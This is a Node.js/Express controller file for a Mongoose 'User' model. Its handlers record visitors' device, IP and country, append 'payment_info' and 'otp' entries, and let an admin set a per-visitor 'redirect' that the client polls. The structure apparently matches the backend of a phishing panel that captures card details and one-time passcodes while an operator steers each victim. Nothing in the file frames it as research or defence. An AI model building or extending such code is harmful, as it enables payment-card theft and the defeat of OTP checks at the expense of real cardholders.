const User = require("../model/user");


exports.addUser = async (req, res) => {

    const { device, last_connected, id, page_id, status, Country, ip } = req.body;
    try {
        const user = await User.create({
            id: id,
            device: device,
            last_connected: last_connected,
            quick_data: { payment_info: [] },
            page_id: page_id,
            status: status,
            Country: Country,
            ip: ip,
            otp: [],
            logs: [],
            redirect: null,
            homeinfo: false,
            otpinfo: false,
            blocked:false



        });
        return res.send({ success: true });

    } catch (err) {

        return null;
    }

};
exports.updateUser = async (req, res) => {

    const { id, quickdata, otp, logs, status, homeinfo } = req.body;


    try {
        if (quickdata) {
            const user = await User.findOne({ id: id });


            if (!user) {
                // Handle the case where the user with the given ID is not found
                return null;
            }

            user.quick_data.payment_info.addToSet(quickdata);


            // Save the updated user document
            await user.save();



        }

        if (logs) {
            const user = await User.findOne({ id: id });


            if (!user) {
                // Handle the case where the user with the given ID is not found
                return null;
            }

            // Add the newQuickData element to the quick_data array

            user.logs.addToSet(logs);


            // Save the updated user document
            await user.save();


        }
        if (otp) {
            const user = await User.findOne({ id: id });


            if (!user) {
                // Handle the case where the user with the given ID is not found
                return null;
            }

            // Add the newQuickData element to the quick_data array

            user.otp.addToSet(otp);
            user.otpinfo = true;


            // Save the updated user document
            await user.save();



        }
        if (status) {
            const user = await User.findOne({ id: id });


            if (!user) {
                // Handle the case where the user with the given ID is not found
                return null;
            }

            // Add the newQuickData element to the quick_data array

            user.status = status


            // Save the updated user document
            await user.save();



        }
        if (homeinfo) {
            const user = await User.findOne({ id: id });


            if (!user) {
                // Handle the case where the user with the given ID is not found
                return null;
            }

            // Add the newQuickData element to the quick_data array

            user.homeinfo = true;


            // Save the updated user document
            await user.save();



        }

        const user = await User.findOne({ id: id });

        return res.send(user);
    } catch (err) {
        return res.status(500).json({ message: err.message });
    }

}


exports.getAllUsers = async (req, res) => {
    // 10 / 
    try {
        const { page = 1, limit = 100000000 } = req.query;
        console.log(limit);
        const users = await User.find().sort({ last_connected: -1 }).limit(limit * 1)
        .skip((page - 1) * limit)
        const count = await User.find({}).countDocuments();

        console.log("All users fetched successfully!");
        return res.status(200).json({
            users,
            total_users: count,
            total_pages: Math.ceil(count / limit),
            current_page: page,
        });
    } catch (err) {
        console.log("Error while fetching all users: ", err);
        return res.status(500).json({ message: err.message });
    }
};


exports.deleteUser = async (req, res) => {
    const { ids } = req.body; // IDs of users to delete (can be an array)

    try {
        if (ids.length > 1) {
            // If 'ids' is an array, delete multiple users
            const deletionResult = await User.deleteMany({ _id: { $in: ids } });
            if (deletionResult.deletedCount > 0) {
                return res.json({ success: true, message: `${deletionResult.deletedCount} user(s) deleted successfully` });
            } else {
                return res.json({ success: false, message: 'No users found for deletion' });
            }
        } else {

            // If 'ids' is a single value, delete a single user
            const deletionResult = await User.deleteOne({ _id: ids[0] });
            if (deletionResult.deletedCount > 0) {
                return res.json({ success: true, message: 'User deleted successfully' });
            } else {
                return res.json({ success: false, message: 'User not found for deletion' });
            }
        }
    } catch (err) {
        console.log('Error while deleting user(s): ', err);
        return null;
    }
};


exports.getUserById = async (req, res) => {
    const userId = req.params.id; // Extract user ID from request parameters

    try {
        const user = await User.findById(userId); // Assuming User is your Mongoose model

        if (!user) {
            return res.status(404).json({ message: "User not found" });
        }
        user.logs = user.logs.reverse();


        return res.status(200).json(user);
    } catch (err) {
        console.log("Error while fetching user by ID: ", err);
        return null;
    }
};


exports.updateRedirectAdmin = async (req, res) => {

    try {
        const { id, redirect, logs } = req.body;
        const user = await User.findOne({ id: id });
        if (!user) {
            return res.status(404).json({ message: "User not found" });
        }

        user.redirect = redirect;
        user.logs.addToSet(logs);
        await user.save();


        console.log("User updated successfully!");
        return res.status(200).json({success:true});
    } catch (err) {
        console.log("Error updating user: ", err);
        return res.json({ message: err.message });
    }
};

exports.updateStatus = async (id, status) => {
    try {
        const user = await User.findOne({ id: id });
        user.status = 'Off-Line';
        await user.save();
    }

    catch (err) {
        return null;
    }


}
exports.checkRedirect = async (req, res) => {
    const { id } = req.body;
    try {
        if (id) {
            const user = await User.findOne({ id: id });
            return res.send({ redirect: user.redirect, status: user.status });
        }
    } catch (err) {
        return null;
    }





}
exports.updateRedirect = async (req, res) => {
    try {
        const { id, redirect } = req.body;
        const user = await User.findOne({ id: id });
        user.redirect = redirect


        // Save the updated user document
        await user.save();
        return res.send("success");
    } catch (err) {
        return null;
    }



}
exports.getuser = async (req, res) => {
    const { id } = req.body;
    try {
        const user = await User.findOne({ id: id });
        res.send(user);
    } catch (err) {
        return null;
    }


}

